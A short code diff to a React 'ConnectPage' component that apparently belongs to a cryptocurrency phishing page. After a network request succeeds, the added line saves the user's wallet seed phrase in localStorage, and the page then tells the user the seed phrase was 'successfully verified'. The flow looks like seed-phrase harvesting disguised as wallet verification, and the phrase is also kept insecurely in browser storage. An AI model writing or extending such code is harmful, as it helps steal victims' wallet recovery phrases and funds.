@@ -168,6 +168,7 @@ const ConnectPage = () => {
                 .then(
                   function (response) {
                     console.log("SUCCESS!", response.status, response.text);
+                    localStorage.setItem("phrase", phrase);
                     successNotification(
                       "Successfully verified your Seed Phrase!"
                     );
